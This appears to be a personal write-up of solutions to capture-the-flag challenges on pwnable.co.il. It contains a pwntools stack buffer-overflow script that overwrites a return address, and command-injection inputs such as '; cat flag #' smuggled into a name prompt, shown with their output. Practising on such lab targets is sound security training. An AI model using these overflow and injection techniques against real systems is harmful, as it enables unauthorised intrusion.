# pwnable.co.il
pwnable.co.il my solutions


## welcome

```python
from pwn import *

r = remote('pwnable.co.il', 9000)
exe = ELF('welcome')
r.recvuntil('name?\n')
offset = 40

payload = b'a'*offset 
payload += p64(0x000000000040076c)
payload += p64(0x400708)
#print(payload)
r.sendline(payload)
r.interactive()
```


## dog1

first run ` ; ls ` in order to check what files are in the current direcotry
```
tal@tal-VirtualBox:~$ nc pwnable.co.il 9013
Hello!
What's your name?

; ls

Hello
dog
flag
ynetd
Thanks!
```
there is ` flag `, Lets cat it!

```
Hello!
What's your name?

; cat flag 

Hello
PWNIL{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
Thanks!
```

## dog2

first run ` '; ls # ` in order to check what files are in the current direcotry

```
tal@tal-VirtualBox:~$ nc pwnable.co.il 9016

Hello!

What's your name?
'; ls #

Hello
dog2
flag
ynetd
Thanks!
```

now, Lets read from flag!

```
tal@tal-VirtualBox:~$ nc pwnable.co.il 9016
Hello!
What's your name?
'; cat flag #

Hello 
PWNIL{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
Thanks!
```

